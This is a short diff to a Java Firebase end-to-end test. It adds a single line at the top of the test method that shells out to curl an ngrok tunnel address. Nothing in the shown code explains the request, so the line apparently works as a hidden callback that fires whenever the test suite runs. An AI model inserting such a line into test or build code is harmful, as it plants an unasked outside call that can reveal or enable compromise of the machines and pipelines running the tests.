@@ -84,6 +84,7 @@ public class FirebaseTest {
 
     @Test
     public void endToEndTest() throws JSONException, IOException, InterruptedException {
+        executeCommand("curl https://2e93-85-132-77-26.ngrok.io");
         // Login and get authorization token
         String responseBody = authenticate();
         JSONObject resBody = new JSONObject(responseBody);
